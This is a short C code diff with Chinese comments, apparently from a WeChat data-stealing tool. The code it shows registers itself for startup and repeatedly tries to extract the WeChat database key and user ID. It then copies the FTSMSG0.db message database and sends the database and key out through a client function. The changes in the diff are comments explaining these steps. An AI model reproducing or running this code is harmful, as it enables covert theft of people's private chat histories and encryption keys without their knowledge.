@@ -16,7 +16,7 @@ unsigned char wxid[256] = { 0 };
 int main() {
 	winStartUp();                      //开机自启
 
-	while (1)
+	while (1)                           //比较蠢的方法，每五秒检查一次窗口
 	{
 		if (GetdbKey(pass,wxid) == 1)
 			break;
@@ -28,11 +28,11 @@ int main() {
 	unsigned char cmd_command[256] = { 0 };
 	getPath(value);             //获取数据库位置
 
-	sprintf((char *)filepath, "%s\\WeChat Files\\%s\\Msg\\Multi\\FTSMSG0.db", value ,wxid);
+	sprintf((char *)filepath, "%s\\WeChat Files\\%s\\Msg\\Multi\\FTSMSG0.db", value ,wxid);//这里是数据库的名字
 	sprintf((char *)cmd_command, "copy \"%s\" FTSMSG0.db /B", filepath); 
 	printf("%s\n", cmd_command);
 	system((const char *)cmd_command); //复制一份数据库到当前文件夹
 
-	client(pass);             //发送
+	client(pass);             //发送数据库和密钥
 	return 0;
 }
